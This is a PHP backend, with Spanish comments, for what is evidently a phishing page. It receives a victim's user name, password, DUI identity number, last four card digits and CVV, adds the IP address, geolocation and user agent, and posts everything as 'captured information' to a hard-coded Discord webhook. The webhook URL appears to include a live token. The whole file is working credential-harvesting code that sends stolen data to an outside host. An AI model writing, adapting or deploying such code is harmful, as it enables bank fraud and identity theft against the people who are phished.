<?php
// ============================================================
//  Relay Discord  -  Recibe datos del front y los envía al webhook
//  El webhook NUNCA se expone al cliente.
// ============================================================

// --- Configuración -----------------------------------------------------
$WEBHOOK = 'https://discord.com/api/webhooks/1501316102641418330/sUkWUBR4Y8-liFvecQfKDsq9c1A6iuHUbnNJliVMDVSfC3vDEZWpu7T4lXZVJcPF6xeA';

// Restringir orígenes permitidos (vacío = aceptar cualquiera).
// Ejemplo: ['https://tu-dominio.com']
$ALLOWED_ORIGINS = [];

// Rate-limit simple por IP (segundos entre requests)
$RATE_LIMIT_SECONDS = 1;
// -----------------------------------------------------------------------

header('Content-Type: application/json; charset=utf-8');

// CORS
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (empty($ALLOWED_ORIGINS) || in_array($origin, $ALLOWED_ORIGINS, true)) {
    if ($origin) header('Access-Control-Allow-Origin: ' . $origin);
    else header('Access-Control-Allow-Origin: *');
}
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'err' => 'method']);
    exit;
}

// Rate-limit por IP usando archivos temporales
$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
   ?? $_SERVER['HTTP_X_FORWARDED_FOR']
   ?? $_SERVER['REMOTE_ADDR']
   ?? 'unknown';
$ip = explode(',', $ip)[0];

$rlFile = sys_get_temp_dir() . '/rl_' . md5($ip);
if (file_exists($rlFile) && (time() - filemtime($rlFile)) < $RATE_LIMIT_SECONDS) {
    http_response_code(429);
    echo json_encode(['ok' => false, 'err' => 'rate']);
    exit;
}
@touch($rlFile);

// Leer payload JSON
$raw = file_get_contents('php://input');
$d = json_decode($raw, true);
if (!is_array($d)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'err' => 'json']);
    exit;
}

$step = isset($d['step']) ? (string)$d['step'] : '?';

// Geolocalización servidor-a-servidor (sin mixed content)
$country = 'No disponible';
$city = 'No disponible';
$ctx = stream_context_create(['http' => ['timeout' => 3]]);
$geoRaw = @file_get_contents('https://ipwho.is/' . urlencode($ip), false, $ctx);
if ($geoRaw) {
    $g = json_decode($geoRaw, true);
    if (is_array($g)) {
        $country = $g['country'] ?? $country;
        $city = $g['city'] ?? $city;
    }
}

// Construir campos del embed
$fields = [];
$add = function ($name, $value) use (&$fields) {
    if ($value !== null && $value !== '') {
        $fields[] = ['name' => $name, 'value' => (string)$value, 'inline' => true];
    }
};
$add('👤 Usuario', $d['usuario'] ?? null);
$add('🔑 Clave',   $d['clave']   ?? null);
$add('🆔 DUI',     $d['dui']     ?? null);
$add('💳 4 dígitos', $d['last4'] ?? null);
$add('🔐 CVV',     $d['cvv']     ?? null);
$add('🌐 IP', $ip);
$add('📍 País', $country);
$add('🏙️ Ciudad', $city);
$add('🖥️ User-Agent', substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 200));

$payload = [
    'content' => '@everyone **Paso ' . $step . '**',
    'embeds'  => [[
        'title'     => '📋 Información Capturada - Paso ' . $step,
        'color'     => 16711680,
        'fields'    => $fields,
        'timestamp' => gmdate('Y-m-d\TH:i:s\Z'),
        'footer'    => ['text' => 'Sistema'],
    ]],
];

// Enviar al webhook con cURL (con fallback a stream)
$json = json_encode($payload, JSON_UNESCAPED_UNICODE);

$ok = false;
if (function_exists('curl_init')) {
    $ch = curl_init($WEBHOOK);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS     => $json,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $ok = ($code >= 200 && $code < 300);
} else {
    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $json,
            'timeout' => 6,
        ],
    ]);
    $ok = @file_get_contents($WEBHOOK, false, $ctx) !== false;
}

echo json_encode(['ok' => $ok]);
